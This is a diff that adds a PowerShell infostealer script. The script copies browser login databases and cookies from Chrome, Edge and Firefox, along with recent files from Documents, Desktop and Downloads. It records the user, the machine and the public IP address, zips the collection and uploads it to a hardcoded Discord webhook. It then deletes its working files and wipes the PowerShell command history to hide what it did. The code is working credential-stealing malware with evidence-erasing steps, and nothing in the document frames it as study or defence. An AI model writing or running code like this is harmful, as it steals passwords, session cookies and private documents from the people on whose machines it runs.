@@ -1,1 +1,88 @@
+# --- 1. CONFIGURATION ---
+# Replace this with your actual Discord Webhook URL
+$webhookUrl = "https://discordapp.com/api/webhooks/1515858036097548418/VYaHlmAcSlF6Cv-t09FodmZZn9TPRsb9GmRATS3W0nz35utbuaf3PhrMofrG8roJz4g_"
 
+# --- 2. DATA COLLECTION ---
+$tempDir = "$env:TEMP\lox_full_exfil"
+if (Test-Path $tempDir) { Remove-Item -Path $tempDir -Recurse -Force }
+New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+
+Write-Output "Starting deep collection..."
+
+# A. Browser Data (Logins, Cookies, History)
+$browserPaths = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+    "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json"
+)
+
+foreach ($path in $browserPaths) {
+    try { Copy-Item $path -Destination $tempDir -ErrorAction SilentlyContinue } catch {}
+}
+
+# B. User Documents & Desktop (The "Everything" part)
+$userFolders = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")
+foreach ($folder in $userFolders) {
+    try { 
+        # We only grab the most recent/relevant files to avoid massive size
+        Get-ChildItem -Path $folder -File | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) } | Copy-Item -Destination $tempDir -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+# C. System Metadata & Identity
+$sysInfo = @"
+🚨 **FULL SYSTEM EXFILTRATION** 🚨
+User: $env:USERNAME
+Computer: $env:COMPUTERNAME
+OS: $(Get-CimInstance Win32_OperatingSystem).Caption
+IP: $(Invoke-RestMethod ipinfo.io/ip)
+Time: $(Get-Date)
+"@
+$sysInfo | Out-File "$tempDir\identity.txt"
+
+# --- 3. COMPRESSION ---
+$zipFile = "$env:TEMP\system_dump.zip"
+Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
+
+# --- 4. EXFILTRATION (With Size Check) ---
+$fileSizeMB = (Get-Item $zipFile).Length / 1MB
+
+if ($fileSizeMB -lt 24) {
+    try {
+        $multipartBody = @{
+            multipart = @{
+                name = "file"
+                content = [System.IO.File]::ReadAllBytes($zipFile)
+            }
+            payload_json = @{
+                content = "🚨 **DATA EXFILTRATED** 🚨`n$sysInfo"
+            }
+        }
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -Body $multipartBody
+    } catch {
+        # Fallback: If upload fails, at least log the error locally
+        "Upload failed" | Out-File "$tempDir\error.txt"
+    }
+} else {
+    # If file is too big, just send the System Info text
+    $multipartBody = @{
+        payload_json = @{ content = "🚨 **DATA TOO LARGE FOR DISCORD** 🚨`n$sysInfo" }
+    }
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body ($multipartBody.payload_json | ConvertTo-Json)
+}
+
+# --- 5. THE "ZERO TRACE" CLEANUP ---
+# Delete the loot folder and the zip file
+if (Test-Path $tempDir) { Remove-Item -Path $tempDir -Recurse -Force }
+if (Test-Path $zipFile) { Remove-Item -Path $zipFile -Force }
+
+# Wipe the PowerShell command history from the disk
+$historyPath = (Get-PSReadlineOption).HistorySavePath
+if (Test-Path $historyPath) { Remove-Item -Path $historyPath -Force }
+
+# Clear the current session history
+Clear-History
+
+# Exit the process
+Exit
